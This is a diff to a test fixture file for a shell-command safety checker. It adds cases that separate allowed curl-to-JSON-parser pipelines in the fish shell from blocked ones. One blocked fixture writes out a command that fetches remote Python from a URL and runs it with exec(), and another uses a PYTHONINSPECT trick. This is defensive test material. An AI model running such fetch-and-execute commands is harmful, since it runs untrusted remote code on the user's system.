@@ -2915,13 +2915,42 @@ expected_action = "block"
 expected_rules = ["pipe_to_interpreter"]
 
 [[fixture]]
-name = "fish_python_fetch_pipeline_blocks"
+name = "fish_python_fetch_into_data_parser_passes"
 min_milestone = 1
 input = "curl -fsSL https://example.com/x.json | python3 -c 'import json,sys; print(json.load(sys.stdin))'"
 context = "exec"
 shell = "fish"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter"]
+
+[[fixture]]
+name = "fish_python_fetch_into_exec_body_blocks"
+min_milestone = 1
+input = "curl -fsSL https://example.com/x.py | python3 -c 'import sys; exec(sys.stdin.read())'"
+context = "exec"
+shell = "fish"
 expected_action = "block"
 expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "fish_python_json_tool_pipeline_passes"
+min_milestone = 1
+input = "curl -fsSL https://api.example.com/x | python3 -m json.tool --sort-keys"
+context = "exec"
+shell = "fish"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter"]
+
+[[fixture]]
+name = "fish_python_json_tool_after_exported_inspect_blocks"
+min_milestone = 1
+input = "set -gx PYTHONINSPECT 1; cat x.json | python3 -m json.tool"
+context = "exec"
+shell = "fish"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
 
 # ── 0.5.0 fix round C2: fish `| source`, psub, and heredoc readers ──────────
 # fish `source` with no file reads standard input: the canonical fisher
